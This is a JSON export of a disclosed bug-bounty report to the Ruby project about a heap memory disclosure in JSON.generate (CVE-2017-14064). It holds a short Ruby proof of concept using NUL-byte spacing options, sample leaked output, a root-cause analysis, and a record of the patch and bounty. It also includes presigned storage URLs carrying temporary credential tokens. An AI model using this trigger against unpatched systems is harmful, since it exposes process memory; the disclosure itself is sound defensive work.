{"id":209949,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDk5NDk=","url":"https://hackerone.com/reports/209949","title":"Arbitrary heap exposure in JSON.generate","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-03-01T22:55:39.657Z","submitted_at":"2017-03-01T22:55:39.657Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ahmadsherif","url":"/ahmadsherif","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7724,"url":"https://hackerone.com/ruby","handle":"ruby","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Ruby","twitter_handle":"","website":"https://www.ruby-lang.org","about":"A Programmer's Best Friend"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2017-14064"],"singular_disclosure_disabled":false,"disclosed_at":"2017-09-25T12:32:43.247Z","bug_reporter_agreed_on_going_public_at":"2017-09-25T12:32:43.206Z","team_member_agreed_on_going_public_at":"2017-09-25T08:29:07.918Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Running this snippet can expose arbitrary memory:\n```ruby\nrequire 'json'\n\nstate = JSON.state.new\nstate.space = \"\\0\" * 1024\n\nputs JSON.generate({a: :b}, state)\n```\n\n```\n{\"a\":\npsych/handlers/recorder.rb\ntensi0\nreeze)\nGem::Specification.new do |s|\n  # to objects of the same type as the original delegate.\nmydata/scm/git/ruby/dist/lib/ruby/2.5.0/json/ext.rb\npass the namP\nSee http://guides.rubygems.org/specification-reference/ for help\n#     # constant and class member data initialization...\n\"b\"}\n```\n\n\nThe issues lies in using `strdup` in [generator.c](https://github.com/ruby/ruby/blob/trunk/ext/json/generator/generator.c#L1103), which will stop after encountering a NULL byte returning a pointer to zero length string, which is not the length stored in `space_len`. Eventually `fbuffer_append` will copy the length of the string (e.g. the 1024 above) into the generated buffer.\n\nSimpler snippets like `JSON.generate({foo: \"bar\"}, space: \"\\0\" * 1024` suffer the same issue but for slightly different reason; as `fstrndup` is using [memccpy](https://github.com/ruby/ruby/blob/trunk/ext/json/generator/generator.c#L311) which will, again, stop copying after encountering a NULL byte returning a pointer to zero length string.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-10-25T08:29:07.956Z","allow_singular_disclosure_after":-125040875.98454507,"singular_disclosure_allowed":true,"vote_count":9,"voters":["flamezzz","bl4de","eveeez","r3y","apapedulimu","marwan","japz","spetr0x","achnoniod"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1514542,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Of course this isn't limited to the `space` option only, but extends to `indent`, `space_before`, `object_nl`, and `array_nl`.","automated_response":false,"created_at":"2017-03-01T22:59:52.924Z","updated_at":"2017-03-01T22:59:52.924Z","actor":{"username":"ahmadsherif","cleared":false,"url":"/ahmadsherif","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1515329,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2017-03-02T10:47:49.556Z","updated_at":"2017-03-02T10:47:49.556Z","actor":{"username":"flori","cleared":false,"url":"/flori","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/146/939/ee67845a5dccc4fa09224b37b830c8e215173fa0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1515375,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you check this?","automated_response":false,"created_at":"2017-03-02T11:16:48.018Z","updated_at":"2017-03-02T11:16:48.018Z","actor":{"username":"flori","cleared":false,"url":"/flori","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/146/939/ee67845a5dccc4fa09224b37b830c8e215173fa0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":165606,"filename":"0001-Fix-arbitrary-heap-exposure-problem.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/165/606/770372534ee2d357a4cfbe71b3ad2797565423a2/0001-Fix-arbitrary-heap-exposure-problem.patch?response-content-disposition=attachment%3B%20filename%3D%220001-Fix-arbitrary-heap-exposure-problem.patch%22%3B%20filename%2A%3DUTF-8%27%270001-Fix-arbitrary-heap-exposure-problem.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTTPJWCNM%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140343Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQDOwM9%2B2Ol25EbTHv2AOl1ZXwoFCdY81Kf4Cj%2BZw5bGagIhALNw4OtUKzuuJ5JDnXIMoizsmzLoA6B3TMlT4JOm5OV%2FKoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBja9Y5H4vqpYK%2BZIq1wMKEFztYF934tg2oiDnz06aS%2BIxaoyblb3k6%2F%2BxBMgQzBtDrU0ocKh0rsBsPTyultSX957Ztb0Xxm%2BlSHqRsjq6d7mkuWsgkJaqQC34P%2FPoowX%2BlH2ZrTK%2FmkJH0GzYvbYPapiuIgj7k6s%2BThAEuj5K1dIvpyoPZSWU4lDCKAHDR63JJK4rjQBzSsyouhVced%2BThWTOJVdRFvPpVLh85ANN2kni9b%2BvA%2BYr4QNdI7bXX3vCy%2Bmlxmt9OtrkNSzeMBq%2B4UjjQL%2BALBrQRVk2zZ5rDj%2ByazHJ4N56LN4FxJEAdf%2BKr7nn9dZ2DExdIbY7%2Blz79tlyq02tT%2B98LGY82aPEMuTJbBZN6Znugvuj3qTN5Ajkz33XEdb09pTvqYEHwNQvHa8molgvM8Hr0UftpVOr%2FcSDQ%2Be7ClWky3g9k3C7fx8DtVeV3YKXMiauv6oe6iv529tf7ZQLwVbk8MDZHKluj8DVRfRr7MlmTLozZouf9SJ7q02NxX1M1zjSiK9%2Bb3knUL5CRpQRCENhmDWhXpTY5NtCVb6swQ3By1ka7LxXtkUadmYfSCwXxpca0jIGluHz9THdy%2Fc3993usF1hP11r0y8u18g%2BZLF5OCf8pMK8LDv4nKUjODow6e2QiwY6pAHH%2FNyAbORzwpluWJFiLzeFhl5RjYZpJEx0nM7ZKbFuGASfNSFcAHpRW7ZXX%2BBSHdPdxqv%2BQd1FC1QHUbL0ZWNROontBy0xjQujOuLkMDUyDfIqsPUVcZohJWSYUkM5yYj9wg6BrbGLNW9NinBFdcPB5%2BIeF%2Bg7o5tKzk0UaPV%2FO3FiQPt3VlESRyrk8YbEQk7JEub211414ZV4sdV3jLFmf60bgw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f7fdbd96e0e8ce6c006a3c06040397464f1527be80edb3739dccc5089c5b0305"}],"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1515467,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@flori Yes, this patch seems to fix the issue.","automated_response":false,"created_at":"2017-03-02T12:40:38.198Z","updated_at":"2017-03-02T12:40:38.198Z","actor":{"username":"ahmadsherif","cleared":false,"url":"/ahmadsherif","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1536079,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, just checking for updates on the report.","automated_response":false,"created_at":"2017-03-12T21:07:54.893Z","updated_at":"2017-03-12T21:07:54.893Z","actor":{"username":"ahmadsherif","cleared":false,"url":"/ahmadsherif","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1604436,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I have released a fix in version 2.0.4.","automated_response":false,"created_at":"2017-04-11T10:46:32.640Z","updated_at":"2017-04-11T10:46:32.640Z","actor":{"username":"flori","cleared":false,"url":"/flori","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/146/939/ee67845a5dccc4fa09224b37b830c8e215173fa0_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1613531,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"I think we can close this now that the new version of JSON is released.  Thanks for reporting this @ahmadsherif ","automated_response":false,"created_at":"2017-04-15T23:05:08.452Z","updated_at":"2017-04-15T23:05:08.452Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ahmadsherif","url":"/ahmadsherif"},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1988095,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","automated_response":false,"created_at":"2017-09-11T04:12:08.957Z","updated_at":"2017-09-11T04:12:08.957Z","cve_ids":["CVE-2017-14064"],"actor":{"username":"usa","cleared":false,"url":"/usa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/084/616/9acacc80c98938df9ce1fbf89adaec99e9aa1e81_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2019710,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We backported this to Ruby 2.2 and 2.3 series.","automated_response":false,"created_at":"2017-09-25T08:28:54.750Z","updated_at":"2017-09-25T08:28:54.750Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Ruby"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ruby","collaborator":{"username":"ahmadsherif","url":"/ahmadsherif"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2019711,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-09-25T08:29:07.936Z","updated_at":"2017-09-25T08:29:07.936Z","first_to_agree":true,"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTTPJWCNM%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140344Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQDOwM9%2B2Ol25EbTHv2AOl1ZXwoFCdY81Kf4Cj%2BZw5bGagIhALNw4OtUKzuuJ5JDnXIMoizsmzLoA6B3TMlT4JOm5OV%2FKoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBja9Y5H4vqpYK%2BZIq1wMKEFztYF934tg2oiDnz06aS%2BIxaoyblb3k6%2F%2BxBMgQzBtDrU0ocKh0rsBsPTyultSX957Ztb0Xxm%2BlSHqRsjq6d7mkuWsgkJaqQC34P%2FPoowX%2BlH2ZrTK%2FmkJH0GzYvbYPapiuIgj7k6s%2BThAEuj5K1dIvpyoPZSWU4lDCKAHDR63JJK4rjQBzSsyouhVced%2BThWTOJVdRFvPpVLh85ANN2kni9b%2BvA%2BYr4QNdI7bXX3vCy%2Bmlxmt9OtrkNSzeMBq%2B4UjjQL%2BALBrQRVk2zZ5rDj%2ByazHJ4N56LN4FxJEAdf%2BKr7nn9dZ2DExdIbY7%2Blz79tlyq02tT%2B98LGY82aPEMuTJbBZN6Znugvuj3qTN5Ajkz33XEdb09pTvqYEHwNQvHa8molgvM8Hr0UftpVOr%2FcSDQ%2Be7ClWky3g9k3C7fx8DtVeV3YKXMiauv6oe6iv529tf7ZQLwVbk8MDZHKluj8DVRfRr7MlmTLozZouf9SJ7q02NxX1M1zjSiK9%2Bb3knUL5CRpQRCENhmDWhXpTY5NtCVb6swQ3By1ka7LxXtkUadmYfSCwXxpca0jIGluHz9THdy%2Fc3993usF1hP11r0y8u18g%2BZLF5OCf8pMK8LDv4nKUjODow6e2QiwY6pAHH%2FNyAbORzwpluWJFiLzeFhl5RjYZpJEx0nM7ZKbFuGASfNSFcAHpRW7ZXX%2BBSHdPdxqv%2BQd1FC1QHUbL0ZWNROontBy0xjQujOuLkMDUyDfIqsPUVcZohJWSYUkM5yYj9wg6BrbGLNW9NinBFdcPB5%2BIeF%2Bg7o5tKzk0UaPV%2FO3FiQPt3VlESRyrk8YbEQk7JEub211414ZV4sdV3jLFmf60bgw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a8f9fe09a6d1e28a73f768e4c3987eb3b06deaa2aefd8d79c8b66e6339f37a5e"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2020447,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-09-25T12:32:43.225Z","updated_at":"2017-09-25T12:32:43.225Z","actor":{"username":"ahmadsherif","cleared":false,"url":"/ahmadsherif","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2020448,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-09-25T12:32:43.261Z","updated_at":"2017-09-25T12:32:43.261Z","actor":{"username":"ahmadsherif","cleared":false,"url":"/ahmadsherif","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}